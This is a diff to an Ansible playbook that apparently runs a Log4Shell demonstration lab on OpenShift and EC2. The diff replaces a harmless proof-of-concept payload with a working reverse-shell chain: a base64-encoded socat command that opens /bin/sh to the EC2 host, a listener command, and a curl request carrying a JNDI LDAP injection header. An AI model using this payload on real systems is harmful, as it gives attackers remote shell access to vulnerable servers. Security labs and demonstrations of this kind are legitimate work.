@@ -5,6 +5,10 @@
   gather_facts: false
 
   tasks:
+    - name: setup the exploit command
+      shell: "echo 'socat TCP4:{{ ec2_instance.instances.0.public_ip_address }}:10250 EXEC:/bin/sh' | base64"
+      register: socat
+
     - debug:
         msg: |
           #######################
@@ -17,18 +21,9 @@
           To access the instance:
             ssh ec2-user@{{ ec2_instance.instances.0.public_dns_name }}
 
-          #######################
-          # Stackrox API Token
-          #######################
-
-          Run the following command to add the token to your environment variables:
-
-          export ROX_API_TOKEN={{ stackrox_token.json.token }}
-
-          To verify success, run the following:
-
-          roxctl --insecure-skip-tls-verify=true -e "{{ stackrox_route.stdout }}:443" image scan --image=quay.io/smileyfritz/log4shell-app:latest
-
           To exploit the app running on OpenShift that is vulnerable to Log4Shell, run the following:
+            ssh ec2-user@{{ ec2_instance.instances.0.public_dns_name }}
+            socat -d -d TCP4-LISTEN:10250,reuseaddr,fork STDOUT
 
-          curl http://{{ log4shell_route.stdout }} -H 'X-Api-Version: ${jndi:ldap://{{ ec2_instance.instances.0.public_ip_address}}:1389/Basic/Command/Base64/ZWNobyAkKGRhdGUgJyslWS8lbS8lZCAlSDolTTolUycpID4gL3RtcC9leHBsb2l0ZWQ=}'
+          From your local system:
+            curl http://{{ log4shell_route.stdout }} -H "X-Api-Version: ${jndi:ldap://{{ ec2_instance.instances.0.public_ip_address}}:1389/Basic/Command/Base64/{{ socat.stdout_lines }}}"
